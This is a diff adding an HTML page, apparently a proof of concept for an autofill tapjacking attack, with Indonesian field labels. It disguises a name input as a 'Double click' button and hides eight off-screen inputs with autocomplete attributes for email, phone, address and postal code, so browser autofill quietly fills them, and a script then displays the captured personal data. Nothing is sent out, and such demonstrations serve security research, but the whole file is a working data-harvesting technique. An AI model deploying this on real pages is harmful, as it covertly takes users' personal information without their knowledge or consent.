@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Form</title>
+  <style>
+    body { font-family: sans-serif; max-width: 400px; margin: 40px auto; padding: 0 16px; }
+    label { display: block; margin-top: 12px; font-size: 14px; }
+    #groupOneElem {
+      display: inline-block;
+      margin-top: 350px;
+      padding: 8px 20px;
+      font-size: 14px;
+      background: #333;
+      color: #fff;
+      border: 1px solid #333;
+      border-radius: 4px;
+      cursor: pointer;
+      caret-color: transparent;
+      box-sizing: border-box;
+    }
+    #groupOneElem::placeholder { color: #fff; }
+    .hidden-fields { position: absolute; left: -9999px; }
+    #pii-output { margin-top: 20px; font-size: 13px; border: 1px solid #ccc; border-radius: 4px; padding: 10px 12px; display: none; background: #f9f9f9; }
+    #pii-output h3 { margin: 0 0 8px; font-size: 13px; color: #555; }
+    #pii-output .row { display: flex; gap: 8px; margin-top: 4px; }
+    #pii-output .key { color: #999; min-width: 110px; }
+    #pii-output .val { color: #111; font-weight: 500; }
+    #indicator { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #f0ad4e; margin-right: 6px; }
+    #indicator.detected { background: #2ecc71; }
+  </style>
+</head>
+<body>
+  <form>
+    <label><h1>Double click the button</h1></label>
+    <input id="groupOneElem" name="name" autocomplete="name" placeholder="Click Me" readonly/>
+    <div class="hidden-fields">
+      <input id="f-email" name="email" type="email" autocomplete="email"/>
+      <input id="f-tel" name="tel" type="tel" autocomplete="tel"/>
+      <input id="f-addr1" name="address-line1" autocomplete="address-line1"/>
+      <input id="f-addr2" name="address-line2" autocomplete="address-line2"/>
+      <input id="f-city" name="city" autocomplete="address-level2"/>
+      <input id="f-state" name="state" autocomplete="address-level1"/>
+      <input id="f-country" name="country-name" autocomplete="country-name"/>
+      <input id="f-postal" name="postal-code" autocomplete="postal-code"/>
+    </div>
+  </form>
+
+  <div id="pii-output">
+    <h3><span id="indicator"></span>Autofill Output Tapjacking</h3>
+    <div id="pii-rows"></div>
+  </div>
+
+  <script>
+    const fields = [
+      { id: 'groupOneElem', label: 'Nama' },
+      { id: 'f-email',      label: 'Email' },
+      { id: 'f-tel',        label: 'Telepon' },
+      { id: 'f-addr1',      label: 'Alamat 1' },
+      { id: 'f-addr2',      label: 'Alamat 2' },
+      { id: 'f-city',       label: 'Kota' },
+      { id: 'f-state',      label: 'Provinsi' },
+      { id: 'f-country',    label: 'Negara' },
+      { id: 'f-postal',     label: 'Kode Pos' },
+    ];
+
+    // Remove readonly on click so autocomplete can trigger
+    document.getElementById('groupOneElem').addEventListener('click', function() {
+      this.removeAttribute('readonly');
+    });
+
+    function renderPII() {
+      const filled = fields.filter(f => document.getElementById(f.id).value.trim() !== '');
+      if (filled.length === 0) {
+        document.getElementById('pii-output').style.display = 'none';
+        document.getElementById('indicator').className = '';
+        return;
+      }
+      document.getElementById('pii-output').style.display = 'block';
+      document.getElementById('indicator').className = 'detected';
+      document.getElementById('pii-rows').innerHTML = filled.map(f =>
+        `<div class="row"><span class="key">${f.label}</span><span class="val">${document.getElementById(f.id).value}</span></div>`
+      ).join('');
+    }
+
+    fields.forEach(f => {
+      document.getElementById(f.id).addEventListener('change', renderPII);
+      document.getElementById(f.id).addEventListener('input', renderPII);
+    });
+
+    setInterval(() => {
+      const anyFilled = fields.some(f => document.getElementById(f.id).value.trim() !== '');
+      if (anyFilled) renderPII();
+    }, 500);
+  </script>
+</body>
+</html>
